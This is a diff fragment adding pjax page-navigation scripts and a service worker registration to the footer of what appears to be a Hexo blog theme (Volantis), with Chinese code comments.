+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+		volantis.pjax.method.complete.start();
+      } catch (e) {
+        console.log(e);
+      }
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.error.start();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+ 
+	  
+    </div>
+  <script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
